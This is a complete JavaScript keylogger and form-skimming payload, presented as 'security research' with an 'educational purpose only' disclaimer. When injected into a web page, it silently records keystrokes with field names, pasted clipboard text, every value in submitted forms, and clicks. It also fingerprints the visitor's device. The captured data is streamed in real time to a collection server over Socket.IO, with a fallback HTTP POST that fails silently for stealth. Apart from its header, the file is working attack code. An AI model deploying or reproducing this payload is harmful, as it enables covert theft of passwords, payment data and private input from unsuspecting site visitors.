/**
 * ═══════════════════════════════════════════════════════════════
 * Security Research: Advanced Web-Based Keystroke Capture Payload
 * ═══════════════════════════════════════════════════════════════
 * 
 * ⚠️  EDUCATIONAL PURPOSE ONLY — Unauthorized use is illegal.
 * 
 * This payload demonstrates multiple capture vectors:
 *   1. Keystroke logging (with field context)
 *   2. Clipboard interception (paste events)
 *   3. Form submission capture (all field values)
 *   4. Click tracking (element identification)
 *   5. Session fingerprinting (browser, OS, screen)
 * 
 * Exfiltration: WebSocket (Socket.IO) for real-time streaming
 * ═══════════════════════════════════════════════════════════════
 */

(function () {
    'use strict';

    // ─── Configuration ─────────────────────────────────────────
    const SERVER_URL = window.location.origin;
    const BUFFER_FLUSH_INTERVAL = 800;  // ms — send buffered keys every 800ms
    const MAX_BUFFER_SIZE = 20;         // flush if buffer reaches this size

    // ─── Session ID Generation ─────────────────────────────────
    function generateSessionId() {
        const stored = sessionStorage.getItem('_rs_sid');
        if (stored) return stored;
        const id = 'sess_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 8);
        sessionStorage.setItem('_rs_sid', id);
        return id;
    }

    const SESSION_ID = generateSessionId();

    // ─── Device Fingerprinting ─────────────────────────────────
    function getFingerprint() {
        const nav = navigator;
        const screen = window.screen;

        // Parse browser from userAgent
        let browser = 'Unknown';
        const ua = nav.userAgent;
        if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Safari')) browser = 'Safari';

        // Parse OS
        let os = 'Unknown';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

        return {
            browser,
            os,
            language: nav.language,
            platform: nav.platform,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: nav.cookieEnabled,
            doNotTrack: nav.doNotTrack,
            timestamp: new Date().toISOString()
        };
    }

    // ─── Socket.IO Connection ──────────────────────────────────
    // Load Socket.IO client dynamically
    function loadSocketIO(callback) {
        if (window.io) return callback(window.io);

        const script = document.createElement('script');
        script.src = SERVER_URL + '/socket.io/socket.io.js';
        script.onload = () => callback(window.io);
        script.onerror = () => {
            console.warn('[Research] Socket.IO client failed to load. Falling back to fetch.');
            callback(null);
        };
        document.head.appendChild(script);
    }

    let socket = null;
    let keystrokeBuffer = [];
    let flushTimer = null;

    // ─── Initialize ────────────────────────────────────────────
    loadSocketIO(function (io) {
        if (io) {
            socket = io(SERVER_URL, {
                transports: ['websocket', 'polling'],
                reconnection: true,
                reconnectionDelay: 2000
            });

            socket.on('connect', () => {
                // Register session with fingerprint
                socket.emit('register', {
                    sessionId: SESSION_ID,
                    metadata: getFingerprint()
                });
            });
        }

        // Start capture once connection is ready (or immediately if no socket)
        initCapture();
    });

    // ─── Flush Buffer ──────────────────────────────────────────
    function flushBuffer() {
        if (keystrokeBuffer.length === 0) return;

        const batch = [...keystrokeBuffer];
        keystrokeBuffer = [];

        if (socket && socket.connected) {
            socket.emit('keystrokes', {
                sessionId: SESSION_ID,
                keys: batch
            });
        } else {
            // Fallback: HTTP POST
            fetch(SERVER_URL + '/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: SESSION_ID, keys: batch })
            }).catch(() => { /* silent fail — stealth */ });
        }
    }

    function scheduleFlush() {
        if (flushTimer) clearTimeout(flushTimer);
        flushTimer = setTimeout(flushBuffer, BUFFER_FLUSH_INTERVAL);
    }

    // ─── Capture: Keystrokes ───────────────────────────────────
    function getFieldInfo(target) {
        if (!target) return { field: 'unknown', formId: null };
        return {
            field: target.name || target.id || target.type || target.tagName?.toLowerCase() || 'unknown',
            formId: target.form?.id || target.form?.name || null
        };
    }

    function handleKeyDown(e) {
        const info = getFieldInfo(e.target);

        // Identify special keys vs printable characters
        let keyValue = e.key;
        const specialKeys = ['Backspace', 'Delete', 'Tab', 'Enter', 'Escape',
            'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown',
            'Shift', 'Control', 'Alt', 'Meta', 'CapsLock'];

        if (specialKeys.includes(keyValue)) {
            keyValue = `[${keyValue}]`;
        } else if (e.ctrlKey || e.metaKey) {
            keyValue = `[Ctrl+${keyValue.toUpperCase()}]`;
        }

        const entry = {
            key: keyValue,
            keyCode: e.keyCode,
            field: info.field,
            formId: info.formId,
            timestamp: new Date().toISOString(),
            modifiers: {
                shift: e.shiftKey,
                ctrl: e.ctrlKey,
                alt: e.altKey,
                meta: e.metaKey
            }
        };

        keystrokeBuffer.push(entry);

        if (keystrokeBuffer.length >= MAX_BUFFER_SIZE) {
            flushBuffer();
        } else {
            scheduleFlush();
        }
    }

    // ─── Capture: Clipboard (Paste) ────────────────────────────
    function handlePaste(e) {
        const pastedText = (e.clipboardData || window.clipboardData)?.getData('text') || '';
        if (!pastedText) return;

        const info = getFieldInfo(e.target);

        if (socket && socket.connected) {
            socket.emit('clipboard', {
                sessionId: SESSION_ID,
                content: pastedText,
                field: info.field,
                timestamp: new Date().toISOString()
            });
        }
    }

    // ─── Capture: Form Submission ──────────────────────────────
    function handleFormSubmit(e) {
        const form = e.target;
        const fields = {};

        // Collect all form field values
        const formData = new FormData(form);
        for (const [key, value] of formData.entries()) {
            fields[key] = value;
        }

        // Also grab any inputs not in FormData (e.g., disabled fields)
        const inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(input => {
            const name = input.name || input.id;
            if (name && !fields[name]) {
                fields[name] = input.value;
            }
        });

        // Flush remaining keystrokes first
        flushBuffer();

        if (socket && socket.connected) {
            socket.emit('form-submit', {
                sessionId: SESSION_ID,
                formId: form.id || form.name || 'unnamed-form',
                fields: fields,
                timestamp: new Date().toISOString()
            });
        }
    }

    // ─── Capture: Click Tracking ───────────────────────────────
    function handleClick(e) {
        const target = e.target;
        const elementInfo = {
            tag: target.tagName?.toLowerCase(),
            id: target.id || null,
            className: target.className || null,
            text: (target.textContent || '').trim().substring(0, 50)
        };

        if (socket && socket.connected) {
            socket.emit('click', {
                sessionId: SESSION_ID,
                element: `${elementInfo.tag}${elementInfo.id ? '#' + elementInfo.id : ''}`,
                text: elementInfo.text,
                timestamp: new Date().toISOString()
            });
        }
    }

    // ─── Visibility Change (detect tab switching) ──────────────
    function handleVisibility() {
        if (socket && socket.connected) {
            socket.emit('keystrokes', {
                sessionId: SESSION_ID,
                keys: [{
                    key: document.hidden ? '[TAB_HIDDEN]' : '[TAB_VISIBLE]',
                    field: 'system',
                    timestamp: new Date().toISOString(),
                    modifiers: {}
                }]
            });
        }
    }

    // ─── Initialize All Capture Hooks ──────────────────────────
    function initCapture() {
        // Keystrokes
        document.addEventListener('keydown', handleKeyDown, true);

        // Clipboard
        document.addEventListener('paste', handlePaste, true);

        // Form submissions — intercept all forms
        document.addEventListener('submit', handleFormSubmit, true);

        // Also capture button clicks that might trigger form submission
        document.querySelectorAll('button[type="button"]').forEach(btn => {
            btn.addEventListener('click', function () {
                const form = this.closest('form');
                if (form) {
                    handleFormSubmit({ target: form });
                }
            });
        });

        // Click tracking
        document.addEventListener('click', handleClick, true);

        // Tab visibility
        document.addEventListener('visibilitychange', handleVisibility);

        // Flush on page unload
        window.addEventListener('beforeunload', flushBuffer);
    }

})();
